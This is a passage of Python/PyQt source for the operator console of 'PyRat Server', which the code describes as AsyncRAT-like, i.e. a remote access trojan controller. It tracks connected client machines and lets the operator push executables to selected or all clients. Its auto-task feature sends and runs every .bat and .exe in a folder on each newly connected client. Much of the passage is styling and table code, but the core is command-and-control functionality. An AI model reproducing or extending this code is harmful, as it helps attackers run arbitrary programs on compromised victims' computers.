        except Exception as e:
            logger.error(f"Error opening tasks folder: {e}")
            QMessageBox.critical(
                self,
                "Error",
                f"Failed to open tasks folder: {e}"
            )

    def add_new_task(self):
        """Create a new auto task"""
        try:
            # Check if any files available
            if self.files_list.count() == 0:
                QMessageBox.warning(
                    self,
                    "No Files Available",
                    "Please add files to the auto tasks directory first."
                )
                return

            # Get selected file
            selected_items = self.files_list.selectedItems()
            if not selected_items:
                QMessageBox.warning(
                    self,
                    "No File Selected",
                    "Please select a file from the list."
                )
                return
                
            file_name = selected_items[0].text()
            file_path = os.path.join(self.auto_tasks_dir, file_name)
            
            # Create task name with unique identifier
            task_name = f"Task_{file_name}_{len(self.auto_tasks)}"
            
            # Create task with default settings
            task = AutomationTask(
                name=task_name,
                file_path=file_path,
                execute_on_connect=True  # By default, execute when client connects
            )
            
            # Add to the auto_tasks dictionary
            with self.auto_tasks_lock:
                self.auto_tasks[task_name] = task
            
            # Add to task table
            row = self.tasks_table.rowCount()
            self.tasks_table.insertRow(row)
            
            self.tasks_table.setItem(row, 0, QTableWidgetItem(task_name))
            self.tasks_table.setItem(row, 1, QTableWidgetItem("File Execution"))
            self.tasks_table.setItem(row, 2, QTableWidgetItem("On Connect"))
            self.tasks_table.setItem(row, 3, QTableWidgetItem("Ready"))
            
            QMessageBox.information(
                self,
                "Task Added",
                f"The task '{task_name}' has been added."
            )
        except Exception as e:
            logger.error(f"Error adding new task: {e}")
            QMessageBox.critical(
                self,
                "Error",
                f"Failed to add task: {e}"
            )

    def remove_selected_task(self):
        """Remove the selected task"""
        try:
            selected_rows = self.tasks_table.selectionModel().selectedRows()
            if not selected_rows:
                QMessageBox.warning(
                    self,
                    "No Task Selected",
                    "Please select a task to remove."
                )
                return
                
            row = selected_rows[0].row()
            task_name = self.tasks_table.item(row, 0).text()
            
            reply = QMessageBox.question(
                self,
                "Remove Task",
                f"Are you sure you want to remove the task '{task_name}'?",
                QMessageBox.Yes | QMessageBox.No,
                QMessageBox.No
            )
            
            if reply == QMessageBox.Yes:
                # Remove the task from the dictionary
                with self.auto_tasks_lock:
                    if task_name in self.auto_tasks:
                        del self.auto_tasks[task_name]
                
                # Remove from table
                self.tasks_table.removeRow(row)
                
                QMessageBox.information(
                    self,
                    "Task Removed",
                    f"The task '{task_name}' has been removed."
                )
        except Exception as e:
            logger.error(f"Error removing task: {e}")
            QMessageBox.critical(
                self,
                "Error",
                f"Failed to remove task: {e}"
            )

    def execute_selected_task(self):
        """Execute the selected task on all connected clients or client selection"""
        try:
            # Check if task selected
            selected_task_rows = self.tasks_table.selectionModel().selectedRows()
            if not selected_task_rows:
                QMessageBox.warning(
                    self,
                    "No Task Selected",
                    "Please select a task to execute."
                )
                return
                
            task_row = selected_task_rows[0].row()
            task_name = self.tasks_table.item(task_row, 0).text()
            
            # Find the task in dictionary
            with self.auto_tasks_lock:
                if task_name not in self.auto_tasks:
                    QMessageBox.warning(
                        self,
                        "Task Not Found",
                        f"Could not find task '{task_name}' in the task list."
                    )
                    return
                task = self.auto_tasks[task_name]
                    
            # Check if file exists
            if not os.path.exists(task.file_path):
                QMessageBox.warning(
                    self,
                    "File Not Found",
                    f"The file associated with task '{task_name}' could not be found."
                )
                return
                
            # Check if any client is selected
            selected_client_rows = self.client_table.selectionModel().selectedRows()
            
            # If client selected, send the file to that client
            if selected_client_rows:
                success_count = 0
                for client_row in selected_client_rows:
                    row = client_row.row()
                    addr = (self.client_table.item(row, 0).text(),
                           int(self.client_table.item(row, 1).text()))
                    
                    # Try to send file
                    self.server_thread.send_file_to_client(task.file_path, addr)
                    success_count += 1
                    
                    # Update task status
                    self.tasks_table.setItem(task_row, 3, QTableWidgetItem("Executing"))
                    
                QMessageBox.information(
                    self,
                    "Task Execution",
                    f"Task '{task_name}' executed on {success_count} client(s)."
                )
            else:
                # Ask if should execute on all clients
                reply = QMessageBox.question(
                    self,
                    "Execute on All Clients",
                    "No client is selected. Do you want to execute the task on all connected clients?",
                    QMessageBox.Yes | QMessageBox.No,
                    QMessageBox.No
                )
                
                if reply == QMessageBox.Yes:
                    # Get all connected clients
                    clients = self.server_thread.client_manager.get_all_clients()
                    if not clients:
                        QMessageBox.warning(
                            self,
                            "No Clients Connected",
                            "There are no clients connected to execute the task on."
                        )
                        return
                        
                    # Send file to all clients
                    self.server_thread.send_file_to_client(task.file_path)
                    
                    # Update task status
                    self.tasks_table.setItem(task_row, 3, QTableWidgetItem("Executing"))
                    
                    QMessageBox.information(
                        self,
                        "Task Execution",
                        f"Task '{task_name}' executed on all connected clients."
                    )
                    
            # Update task's last run time
            with self.auto_tasks_lock:
                if task_name in self.auto_tasks:
                    self.auto_tasks[task_name].last_run = datetime.now()
        except Exception as e:
            logger.error(f"Error executing task: {e}")
            QMessageBox.critical(
                self,
                "Error",
                f"Failed to execute task: {e}"
            )

    def check_auto_execute_tasks(self, addr: tuple):
        """Check and execute auto tasks that should run when a client connects"""
        logger.info(f"DEBUG: check_auto_execute_tasks called for {addr}")
        try:
            # Verify client has a session key before attempting to execute tasks
            client = self.server_thread.client_manager.get_client(addr)
            if not client:
                logger.info(f"DEBUG: Client {addr} not found, cannot execute tasks")
                return
                
            if not hasattr(client, 'session_key') or not client.session_key:
                logger.info(f"DEBUG: Client {addr} not ready for tasks yet, session key not established. Retrying in 5 seconds.")
                # Schedule retry after 5 seconds
                QTimer.singleShot(5000, lambda: self.check_auto_execute_tasks(addr))
                return

            # Check for available files in autotasks folder
            if not os.path.exists(self.auto_tasks_dir):
                logger.info(f"DEBUG: No autotasks directory found")
                return
                
            # Get all .bat and .exe files in autotasks folder
            task_files = [f for f in os.listdir(self.auto_tasks_dir) 
                         if os.path.isfile(os.path.join(self.auto_tasks_dir, f)) and 
                         (f.endswith('.bat') or f.endswith('.exe'))]
            
            if not task_files:
                logger.info(f"DEBUG: No task files found in autotasks directory")
                return
                
            logger.info(f"DEBUG: Found {len(task_files)} task files to execute")
            
            # Execute each file
            for file_name in task_files:
                file_path = os.path.join(self.auto_tasks_dir, file_name)
                if os.path.exists(file_path):
                    logger.info(f"Auto-executing file '{file_name}' on newly connected client {addr}")
                    self.append_log(f"Auto-executing file '{file_name}' on {addr}", LogType.FILE_TRANSFER)
                    
                    # Use a separate thread to avoid blocking GUI
                    execute_thread = threading.Thread(
                        target=self.execute_file_task_async,
                        args=(file_path, addr)
                    )
                    execute_thread.daemon = True
                    execute_thread.start()
                    
                    # Short delay between tasks to prevent overwhelming the client
                    time.sleep(0.5)
                    
        except Exception as e:
            logger.error(f"Error checking auto tasks: {e}")
            
    def execute_file_task_async(self, file_path: str, addr: tuple):
        """Helper method to execute file task in a separate thread"""
        try:
            logger.info(f"Sending file {file_path} to {addr}")
            # Use proper file sending method with retries
            success = self.server_thread.send_file_to_client(file_path, addr, 0, 3)
            if success:
                logger.info(f"Successfully queued file {os.path.basename(file_path)} for {addr}")
            else:
                logger.error(f"Failed to queue file {os.path.basename(file_path)} for {addr}")
        except Exception as e:
            logger.error(f"Error executing file task: {e}")

    def __init__(self):
        super().__init__()
        self.gui_lock = threading.Lock()
        self.setWindowTitle("PyRat Server")
        self.setGeometry(100, 100, 1400, 900)
        self.setFont(QFont("Segoe UI", 9))
        
        # Initialize auto tasks directory and list
        self.auto_tasks_dir = "autotasks"
        self.auto_tasks = {}  # Dictionary of task name to task object
        if not os.path.exists(self.auto_tasks_dir):
            os.makedirs(self.auto_tasks_dir)
        
        # Setup file watcher for auto tasks directory
        self.file_watcher = QFileSystemWatcher()
        self.file_watcher.addPath(os.path.abspath(self.auto_tasks_dir))
        self.file_watcher.directoryChanged.connect(self.refresh_auto_tasks_files)

        # Apply global dark theme stylesheet
        self.setStyleSheet("""
            QMainWindow {
                background-color: #2E2E2E;
            }
            QWidget {
                background-color: #2E2E2E;
                color: #E0E0E0;
                font-family: 'Segoe UI', Arial, sans-serif;
                font-size: 9pt;
            }
            QTableWidget {
                background-color: #252525;
                color: #E0E0E0;
                gridline-color: #3A3A3A;
                border: 1px solid #3A3A3A;
                selection-background-color: #007ACC; /* Bright blue for selection */
                selection-color: #FFFFFF;
            }
            QTableWidget::item {
                padding: 6px;
                border-bottom: 1px solid #3A3A3A;
            }
            QHeaderView::section {
                background-color: #3A3A3A;
                color: #E0E0E0;
                padding: 6px;
                border: none;
                border-bottom: 1px solid #4A4A4A;
                font-weight: bold;
            }
            QPushButton {
                background-color: #007ACC;
                color: white;
                border: 1px solid #005C9E;
                padding: 6px 12px;
                border-radius: 3px;
                font-weight: bold;
            }
            QPushButton:hover {
                background-color: #005C9E;
            }
            QPushButton:pressed {
                background-color: #004C80;
            }
            QPushButton:disabled {
                background-color: #4A4A4A;
                color: #8E8E8E;
            }
            QTextEdit {
                background-color: #252525;
                color: #E0E0E0;
                border: 1px solid #3A3A3A;
                font-family: 'Consolas', 'Courier New', monospace;
            }
            QStatusBar {
                background-color: #1E1E1E;
                color: #E0E0E0;
                border-top: 1px solid #3A3A3A;
            }
            QLabel {
                color: #E0E0E0;
            }
            QToolBar {
                background-color: #2E2E2E;
                border-bottom: 1px solid #3A3A3A;
                spacing: 5px;
            }
            QToolBar QToolButton {
                background-color: transparent;
                color: #E0E0E0;
                border: none;
                padding: 5px;
            }
            QToolBar QToolButton:hover {
                background-color: #3A3A3A;
            }
            QToolBar QToolButton:pressed {
                background-color: #4A4A4A;
            }
            QMenu {
                background-color: #2E2E2E;
                color: #E0E0E0;
                border: 1px solid #3A3A3A;
            }
            QMenu::item {
                padding: 8px 20px;
            }
            QMenu::item:selected {
                background-color: #007ACC;
            }
            QMenu::separator {
                height: 1px;
                background-color: #3A3A3A;
                margin-left: 5px;
                margin-right: 5px;
            }
            QScrollBar:vertical {
                border: none;
                background: #252525;
                width: 12px;
                margin: 0px;
            }
            QScrollBar::handle:vertical {
                background: #4A4A4A;
                min-height: 20px;
                border-radius: 6px;
            }
            QScrollBar::add-line:vertical, QScrollBar::sub-line:vertical {
                height: 0px;
            }
            QScrollBar:horizontal {
                border: none;
                background: #252525;
                height: 12px;
                margin: 0px;
            }
            QScrollBar::handle:horizontal {
                background: #4A4A4A;
                min-width: 20px;
                border-radius: 6px;
            }
            QScrollBar::add-line:horizontal, QScrollBar::sub-line:horizontal {
                width: 0px;
            }
        """)

        # Initialize logging components first
        self.log_table = None
        self.client_table = None
        self.task_table = None
        self.automation_tasks = []
        self.system_info = None
        
        # Initialize signal handler first
        self.signal_handler = SignalHandler()
        self.signal_handler.log_signal.connect(self.append_log)
        self.signal_handler.add_client_signal.connect(self.add_client)
        self.signal_handler.remove_client_signal.connect(self.remove_client)
        self.signal_handler.update_client_status_signal.connect(self.update_client_status)
        self.signal_handler.update_gui_signal.connect(self.update_gui)
        
        # Initialize GUI components
        self.init_gui()
        
        # Initialize server thread
        self.server_thread = ServerThread(self.signal_handler)
        
        # Start server thread
        self.server_thread.start()
        
        # Initialize other variables
        self.client_count = 0
        self.clients = {}
        self.pending_updates = []
        self.last_update = time.time()
        self.update_interval = 0.05  # Update GUI every 50ms for better responsiveness
        
        # Set up system tray
        self.setup_tray_icon()
        
        # Set window icon
        self.setWindowIcon(self.style().standardIcon(QStyle.SP_ComputerIcon))
        
        # Start GUI update timer with higher priority but less frequent updates
        self.update_timer = QTimer()
        self.update_timer.timeout.connect(self.process_pending_updates)
        self.update_timer.start(250)  # Update every 250ms instead of 50ms for better performance
        
        # Set process priority
        if sys.platform == 'win32':
            try:
                import win32api, win32process, win32con
                pid = win32api.GetCurrentProcessId()
                handle = win32api.OpenProcess(win32con.PROCESS_ALL_ACCESS, True, pid)
                win32process.SetPriorityClass(handle, win32process.HIGH_PRIORITY_CLASS)
            except:
                pass

        # Initialize automation tasks
        self.auto_tasks_lock = threading.Lock()
        self.auto_tasks = {}  # Dictionary of task name to task object

    def init_gui(self):
        """Initialize the GUI components with a dark, AsyncRAT-like theme"""
        self.setWindowTitle("PyRat Server")
        self.setGeometry(100, 100, 1400, 900)
        self.setFont(QFont("Segoe UI", 9))

        # Create central widget and main layout
        central_widget = QWidget()
        self.setCentralWidget(central_widget)
        main_layout = QVBoxLayout(central_widget)
        main_layout.setSpacing(0)
        main_layout.setContentsMargins(0, 0, 0, 0)

        # Create tabs
        self.tabs = QTabWidget()
        self.tabs.setDocumentMode(True)
        self.tabs.setStyleSheet("""
            QTabWidget::pane {
                border: 1px solid #3A3A3A;
                background-color: #2E2E2E;
                top: -1px;
            }
            QTabBar::tab {
                background-color: #252525;
                color: #AAAAAA;
                padding: 8px 16px;
                border: 1px solid #3A3A3A;
                border-bottom: none;
                border-top-left-radius: 4px;
                border-top-right-radius: 4px;
            }
            QTabBar::tab:selected {
                background-color: #3A3A3A;
                color: #FFFFFF;
                border-bottom: 1px solid #007ACC;
            }
            QTabBar::tab:hover:!selected {
                background-color: #2A2A2A;
            }
        """)

        # --- Main Tab: Clients & Logs ---
        main_tab = QWidget()
        main_tab_layout = QVBoxLayout(main_tab)
        main_tab_layout.setSpacing(0)
        main_tab_layout.setContentsMargins(0, 0, 0, 0)
        
        # --- Main Content Area (Splitter) ---
        splitter = QSplitter(Qt.Vertical)
        splitter.setStyleSheet("QSplitter::handle { background-color: #3A3A3A; }")
        splitter.setHandleWidth(2)

        # Client Table Section
        client_section_widget = QWidget()
        client_layout = QVBoxLayout(client_section_widget)
        client_layout.setContentsMargins(5, 5, 5, 5)
        client_header = QLabel("Connected Clients")
        client_header.setStyleSheet("font-weight: bold; font-size: 14px; color: #E0E0E0; padding-bottom: 5px;")
        client_layout.addWidget(client_header)
        
        self.client_table = QTableWidget()
        self.client_table.setColumnCount(6)
        self.client_table.setHorizontalHeaderLabels([
            "IP Address", "Port", "Status", "Connect Time", "Uptime", "Actions"
        ])
        self.client_table.horizontalHeader().setSectionResizeMode(QHeaderView.Stretch)
        self.client_table.horizontalHeader().setSectionResizeMode(5, QHeaderView.ResizeToContents) # Actions column
        self.client_table.setSelectionBehavior(QTableWidget.SelectRows)
        self.client_table.setEditTriggers(QTableWidget.NoEditTriggers)
        self.client_table.setShowGrid(True)
        self.client_table.setAlternatingRowColors(True) # Subtle alternating row colors
        self.client_table.setStyleSheet(self.client_table.styleSheet() + \
                                        "QTableWidget { alternate-background-color: #2A2A2A; }")
        client_layout.addWidget(self.client_table)
        splitter.addWidget(client_section_widget)

        # Log Table Section
        log_section_widget = QWidget()
        log_layout = QVBoxLayout(log_section_widget)
        log_layout.setContentsMargins(5, 5, 5, 5)
        log_header = QLabel("Server Logs")
        log_header.setStyleSheet("font-weight: bold; font-size: 14px; color: #E0E0E0; padding-bottom: 5px;")
        log_layout.addWidget(log_header)
        
        self.log_table = QTableWidget()
        self.log_table.setColumnCount(4)
        self.log_table.setHorizontalHeaderLabels([
            "Timestamp", "Type", "Source/Client", "Message"
        ])
        self.log_table.horizontalHeader().setSectionResizeMode(QHeaderView.Stretch)
        self.log_table.horizontalHeader().setSectionResizeMode(0, QHeaderView.ResizeToContents) # Timestamp
        self.log_table.horizontalHeader().setSectionResizeMode(1, QHeaderView.ResizeToContents) # Type
        self.log_table.setSelectionBehavior(QTableWidget.SelectRows)
        self.log_table.setEditTriggers(QTableWidget.NoEditTriggers)
        self.log_table.setShowGrid(True)
        self.log_table.setAlternatingRowColors(True)
        self.log_table.setStyleSheet(self.log_table.styleSheet() +\
                                     "QTableWidget { alternate-background-color: #2A2A2A; }")
        log_layout.addWidget(self.log_table)
        splitter.addWidget(log_section_widget)

        main_tab_layout.addWidget(splitter)
        splitter.setSizes([int(self.height() * 0.6), int(self.height() * 0.4)]) # Initial sizing
        
        # --- Auto Tasks Tab ---
        auto_tasks_tab = QWidget()
        auto_tasks_layout = QVBoxLayout(auto_tasks_tab)
        auto_tasks_layout.setContentsMargins(10, 10, 10, 10)
        
        # Split the auto tasks tab into two sections
        auto_tasks_splitter = QSplitter(Qt.Horizontal)
        auto_tasks_splitter.setStyleSheet("QSplitter::handle { background-color: #3A3A3A; }")
        auto_tasks_splitter.setHandleWidth(2)
        
        # Left side: Tasks list and controls
        tasks_widget = QWidget()
        tasks_layout = QVBoxLayout(tasks_widget)
        tasks_layout.setContentsMargins(0, 0, 0, 0)
        
        tasks_header = QLabel("Auto Tasks")
        tasks_header.setStyleSheet("font-weight: bold; font-size: 14px; color: #E0E0E0; padding-bottom: 5px;")
        tasks_layout.addWidget(tasks_header)
        
        # Tasks table
        self.tasks_table = QTableWidget()
        self.tasks_table.setColumnCount(4)
        self.tasks_table.setHorizontalHeaderLabels([
            "Task Name", "Type", "Execute On", "Status"
        ])
        self.tasks_table.horizontalHeader().setSectionResizeMode(QHeaderView.Stretch)
        self.tasks_table.setSelectionBehavior(QTableWidget.SelectRows)
        self.tasks_table.setEditTriggers(QTableWidget.NoEditTriggers)
        self.tasks_table.setShowGrid(True)
        self.tasks_table.setAlternatingRowColors(True)
        self.tasks_table.setStyleSheet(
            "QTableWidget { alternate-background-color: #2A2A2A; }"
        )
        tasks_layout.addWidget(self.tasks_table)
        
        # Task controls
        task_controls = QHBoxLayout()
        
        add_task_btn = QPushButton("Add Task")
        add_task_btn.setIcon(self.style().standardIcon(QStyle.SP_FileDialogNewFolder))
        add_task_btn.setStyleSheet("""
            QPushButton {
                background-color: #007ACC;
                color: white;
                border: 1px solid #005C9E;
                padding: 8px 16px;
                border-radius: 3px;
                font-weight: bold;
                font-size: 11pt;
                min-width: 120px;
            }
            QPushButton:hover {
                background-color: #0088DD;
            }
            QPushButton:pressed {
                background-color: #005C9E;
            }
        """)
        add_task_btn.clicked.connect(self.add_new_task)
        
        remove_task_btn = QPushButton("Remove Task")
        remove_task_btn.setIcon(self.style().standardIcon(QStyle.SP_TrashIcon))
        remove_task_btn.setStyleSheet("""
            QPushButton {
                background-color: #E74C3C;
                color: white;
                border: 1px solid #C0392B;
                padding: 8px 16px;
                border-radius: 3px;
                font-weight: bold;
                font-size: 11pt;
                min-width: 120px;
            }
            QPushButton:hover {
                background-color: #F5543F;
            }
            QPushButton:pressed {
                background-color: #C0392B;
            }
        """)
        remove_task_btn.clicked.connect(self.remove_selected_task)
        
        execute_task_btn = QPushButton("Execute Now")
        execute_task_btn.setIcon(self.style().standardIcon(QStyle.SP_MediaPlay))
        execute_task_btn.setStyleSheet("""
            QPushButton {
                background-color: #2ECC71;
                color: white;
                border: 1px solid #27AE60;
                padding: 8px 16px;
                border-radius: 3px;
                font-weight: bold;
                font-size: 11pt;
                min-width: 120px;
            }
            QPushButton:hover {
                background-color: #4DDD87;
            }
            QPushButton:pressed {
                background-color: #27AE60;
            }
        """)
        execute_task_btn.clicked.connect(self.execute_selected_task)
        
        task_controls.addWidget(add_task_btn)
        task_controls.addWidget(remove_task_btn)
        task_controls.addWidget(execute_task_btn)
        
        tasks_layout.addLayout(task_controls)
        auto_tasks_splitter.addWidget(tasks_widget)
        
        # Right side: Files and auto-execution settings
        files_widget = QWidget()
        files_layout = QVBoxLayout(files_widget)
        files_layout.setContentsMargins(0, 0, 0, 0)
        
        files_header = QLabel("Auto Task Files")
        files_header.setStyleSheet("font-weight: bold; font-size: 14px; color: #E0E0E0; padding-bottom: 5px;")
        files_layout.addWidget(files_header)
        
        # Files list
        self.files_list = QListWidget()
        self.files_list.setStyleSheet(
            "QListWidget { background-color: #252525; border: 1px solid #3A3A3A; }"
            "QListWidget::item { padding: 5px; border-bottom: 1px solid #3A3A3A; }"
            "QListWidget::item:selected { background-color: #007ACC; color: white; }"
        )
        files_layout.addWidget(self.files_list)
        
        # File controls
        file_controls = QHBoxLayout()
        
        add_file_btn = QPushButton("Add File")
        add_file_btn.setIcon(self.style().standardIcon(QStyle.SP_FileDialogNewFolder))
        add_file_btn.setStyleSheet("""
            QPushButton {
                background-color: #3498DB;
                color: white;
                border: 1px solid #2980B9;
                padding: 8px 16px;
                border-radius: 3px;
                font-weight: bold;
                font-size: 11pt;
                min-width: 120px;
            }
            QPushButton:hover {
                background-color: #41A4EB;
            }
            QPushButton:pressed {
                background-color: #2980B9;
            }
        """)
        add_file_btn.clicked.connect(self.add_task_file)
        
        open_folder_btn = QPushButton("Open Folder")
        open_folder_btn.setIcon(self.style().standardIcon(QStyle.SP_DirOpenIcon))
        open_folder_btn.setStyleSheet("""
            QPushButton {
                background-color: #9B59B6;
                color: white;
                border: 1px solid #8E44AD;
                padding: 8px 16px;
                border-radius: 3px;
                font-weight: bold;
                font-size: 11pt;
                min-width: 120px;
            }
            QPushButton:hover {
                background-color: #A569BD;
            }
            QPushButton:pressed {
                background-color: #8E44AD;
            }
        """)
        open_folder_btn.clicked.connect(self.open_tasks_folder)
        
        file_controls.addWidget(add_file_btn)
        file_controls.addWidget(open_folder_btn)
        file_controls.addStretch()
        
        files_layout.addLayout(file_controls)
        auto_tasks_splitter.addWidget(files_widget)
        
        auto_tasks_layout.addWidget(auto_tasks_splitter)
        
        # Add tabs to the tab widget
        self.tabs.addTab(main_tab, "Clients & Logs")
        self.tabs.addTab(auto_tasks_tab, "Auto Tasks")
        
        # Add the tab widget to the main layout
        main_layout.addWidget(self.tabs)
        
        # Load existing auto task files
        self.refresh_auto_tasks_files()

        # --- Toolbar ---
        toolbar = QToolBar("Main Toolbar")
        toolbar.setIconSize(QSize(16, 16))
        self.addToolBar(Qt.TopToolBarArea, toolbar)

        send_action = QAction(QIcon.fromTheme("document-send", self.style().standardIcon(QStyle.SP_FileDialogToParent)), "Send File", self)
        send_action.triggered.connect(self.send_file_to_selected)
        toolbar.addAction(send_action)

        clear_action = QAction(QIcon.fromTheme("edit-clear", self.style().standardIcon(QStyle.SP_TrashIcon)), "Clear Logs", self)
        clear_action.triggered.connect(self.clear_logs)
        toolbar.addAction(clear_action)
        
        toolbar.addSeparator()
        
        # Example for future plugin buttons
        # plugin_action = QAction(QIcon.fromTheme("utilities-terminal"), "Manage Plugins", self)
        # toolbar.addAction(plugin_action)

        # --- Status Bar ---
        self.statusBar = QStatusBar()
        self.setStatusBar(self.statusBar)
        self.client_count_label = QLabel("Clients: 0")
        self.statusBar.addPermanentWidget(self.client_count_label)
        self.server_status_label = QLabel(f"Listening on {HOST}:{PORT}")
        self.statusBar.addWidget(self.server_status_label)

    def send_file_to_selected(self):
        """Send file to selected clients"""
        selected_rows = self.client_table.selectedItems()
        if not selected_rows:
            QMessageBox.warning(self, "Warning", "Please select at least one client")
            return
            
        file_path, _ = QFileDialog.getOpenFileName(
            self,
            "Select File to Send",
            "",
            "Executable Files (*.exe);;All Files (*.*)"
        )
        
        if file_path:
            for item in selected_rows:
                row = item.row()
                addr = (self.client_table.item(row, 0).text(),
                       int(self.client_table.item(row, 1).text()))
                self.server_thread.send_file_to_client(file_path, addr)

    def clear_logs(self):
        """Clear the log table"""
        self.log_table.setRowCount(0)

    def update_gui(self):
        """Process any pending GUI updates"""
        self.process_pending_updates()

    def process_pending_updates(self):
        """Process pending GUI updates in batches"""
        try:
            if not self.pending_updates:
                return
                
            # Process updates in batches of 25
            batch_size = 25
            updates = self.pending_updates[:batch_size]
            self.pending_updates = self.pending_updates[batch_size:]
            
            # Group updates by type for more efficient processing
            client_updates = []
            log_updates = []
            status_updates = []
            
            for update_type, data in updates:
                if update_type == "add_client":
                    client_updates.append(data)
                elif update_type == "remove_client":
                    client_updates.append(data)
                elif update_type == "update_status":
                    status_updates.append(data)
                elif update_type == "log":
                    log_updates.append(data)
            
            # Process client updates
            for addr in client_updates:
                if addr in self.clients:
                    self._remove_client_impl(addr)
                else:
                    self._add_client_impl(addr)
            
            # Process status updates
            for addr, status in status_updates:
                if addr in self.clients:
                    self._update_client_status_impl(addr, status)
            
            # Process log updates
            for data in log_updates:
                self._append_log_impl(data)
            
            # Schedule next update if there are more pending
            if self.pending_updates:
                QTimer.singleShot(50, self.process_pending_updates)
                
        except Exception as e:
            logger.error(f"Error processing pending updates: {e}")
            # Clear pending updates on error to prevent accumulation
            self.pending_updates = []

    def _add_client_impl(self, addr: tuple):
        """Implementation of adding a client to the table, preventing duplicates."""
        with self.gui_lock:
            try:
                # Ensure autotasks directory exists
                if not os.path.exists(self.auto_tasks_dir):
                    os.makedirs(self.auto_tasks_dir)
                    
                # Add client to table
                row = self.client_table.rowCount()
                self.client_table.insertRow(row)

                ip_item = QTableWidgetItem(addr[0])
                port_item = QTableWidgetItem(str(addr[1]))
                status_item = QTableWidgetItem("Connecting...")
                status_item.setForeground(QColor("#FFC107"))  # Yellow for connecting
                time_item = QTableWidgetItem(datetime.now().strftime("%Y-%m-%d %H:%M:%S"))
                uptime_item = QTableWidgetItem("00:00:00")

                for item in [ip_item, port_item, status_item, time_item, uptime_item]:
                    item.setTextAlignment(Qt.AlignCenter)

                self.client_table.setItem(row, 0, ip_item)
                self.client_table.setItem(row, 1, port_item)
                self.client_table.setItem(row, 2, status_item)
                self.client_table.setItem(row, 3, time_item)
                self.client_table.setItem(row, 4, uptime_item)

                # Create action buttons
                actions_widget = QWidget()
                actions_layout = QHBoxLayout(actions_widget)
                actions_layout.setContentsMargins(2, 2, 2, 2)
                actions_layout.setSpacing(3)
                
                send_btn = QPushButton("Send")
                send_btn.setStyleSheet("""
                    QPushButton {
                        background-color: #007ACC;
                        color: white;
                        border: 1px solid #005C9E;
                        padding: 4px 8px;
                        border-radius: 2px;
                        font-weight: bold;
                        font-size: 10pt;
                        min-width: 70px;
                    }
                    QPushButton:hover {
                        background-color: #0088DD;
                    }
                    QPushButton:pressed {
                        background-color: #005C9E;
                    }
                """)
                send_btn.setToolTip("Send file to this client")
                send_btn.clicked.connect(lambda: self.send_file_to_client(addr))
                
                disconnect_btn = QPushButton("Kill")
                disconnect_btn.setStyleSheet("""
                    QPushButton {
                        background-color: #E74C3C;
                        color: white;
                        border: 1px solid #C0392B;
                        padding: 4px 8px;
                        border-radius: 2px;
                        font-weight: bold;
                        font-size: 10pt;
                        min-width: 70px;
                    }
                    QPushButton:hover {
                        background-color: #F5543F;
                    }
                    QPushButton:pressed {
                        background-color: #C0392B;
                    }
                """)
                disconnect_btn.setToolTip("Disconnect this client")
                disconnect_btn.clicked.connect(lambda: self.disconnect_client(addr))
                
                actions_layout.addWidget(send_btn)
                actions_layout.addWidget(disconnect_btn)
                actions_layout.addStretch()
                self.client_table.setCellWidget(row, 5, actions_widget)

                # Critical: Register client in self.clients here
                if addr not in self.clients:
                    self.client_count += 1
                self.clients[addr] = {
                    "row": row, 
                    "connect_time": datetime.now(), 
                    "last_seen": datetime.now(), 
                    "uptime_timer": QTimer(),
                    "status": "Pending Add..." # Initial internal status
                }
                self.client_count_label.setText(f"Clients: {self.client_count}")
                self._start_uptime_timer(addr, row)
                logger.info(f"Client {addr} added to GUI at row {row}.")

            except Exception as e:
                logger.error(f"Error in _add_client_impl for {addr}: {e}")

    def _remove_client_impl(self, addr: tuple):
        """Implementation of removing a client from the table and stopping its timer."""
        with self.gui_lock:
            try:
                if addr in self.clients:
                    client_data = self.clients.pop(addr) # Remove from dict and get data
                    row_to_remove = client_data["row"]
                    client_data["uptime_timer"].stop()
                    
                    self.client_table.removeRow(row_to_remove)
                    logger.info(f"Client {addr} removed from GUI at row {row_to_remove}.")

                    self.client_count -= 1
                    self.client_count_label.setText(f"Clients: {self.client_count}")
                    
                    # Adjust row indices for clients that were below the removed one
                    for remaining_addr, remaining_data in self.clients.items():
                        if remaining_data["row"] > row_to_remove:
                            remaining_data["row"] -= 1
                else:
                    logger.warning(f"_remove_client_impl: Attempted to remove non-existent or already removed client: {addr}")
            except Exception as e:
                logger.error(f"Error in _remove_client_impl for {addr}: {e}")

    def _update_client_status_impl(self, addr: tuple, status: str):
        """Implementation of updating client status in the table"""
        with self.gui_lock:
            try:
                if addr not in self.clients:
                    # This can happen if remove_client signal processed faster than a lingering status update
                    logger.warning(f"_update_client_status_impl: Attempted to update status for unknown/removed client: {addr} to {status}")
                    return

                client_data = self.clients[addr]
                row = client_data["row"]
                client_data["status"] = status # Update internal status tracker

                if row < self.client_table.rowCount():
                    status_item = self.client_table.item(row, 2)
                    if not status_item:
                        status_item = QTableWidgetItem()
                        self.client_table.setItem(row, 2, status_item)
                    status_item.setText(status)
                    status_item.setTextAlignment(Qt.AlignCenter)

                    # Color coding (same as before)
                    if status == "Authenticated" or status == "Connected":
                        status_item.setForeground(QColor("#4CAF50"))
                    elif status == "Key Exchange Failed" or status == "Disconnected" or status == "Key Exchange Timeout" or status == "Key Exchange Error":
                        status_item.setForeground(QColor("#F44336"))
                    elif status == "Connecting..." or status == "Key Exchange...":
                        status_item.setForeground(QColor("#FFC107"))
                    elif status == "Sending File":
                        status_item.setForeground(QColor("#2196F3"))
                    else:
                        status_item.setForeground(QColor("#E0E0E0"))
                    
                    client_data["last_seen"] = datetime.now()
                else:
                    logger.warning(f"_update_client_status_impl: Row {row} out of bounds for client {addr} (status: {status}). Client table count: {self.client_table.rowCount()}")

            except Exception as e:
                logger.error(f"Error in _update_client_status_impl for {addr}, status {status}: {e}")

    def _start_uptime_timer(self, addr: tuple, row: int):
        """Starts a QTimer to update the uptime for a specific client."""
        if addr not in self.clients:
            return
        
        timer = self.clients[addr]["uptime_timer"]
        timer.timeout.connect(lambda: self._update_uptime(addr, row))
        timer.start(3000) # Update every 3 seconds instead of every second to reduce UI load

    def _update_uptime(self, addr: tuple, row: int):
        """Updates the uptime display in the client table."""
        with self.gui_lock: # Protect access to self.clients and table
            if addr not in self.clients: # Client might have been removed
                # The timer for this addr should have been stopped by _remove_client_impl
                # but as a safeguard, we check here too.
                return

            # Ensure row index is still valid for the *current* state of self.clients[addr]
            current_row_for_addr = self.clients[addr]["row"]

            if current_row_for_addr >= self.client_table.rowCount():
                logger.warning(f"_update_uptime: Row {current_row_for_addr} for client {addr} is out of bounds. Stopping timer.")
                self.clients[addr]["uptime_timer"].stop()
                return

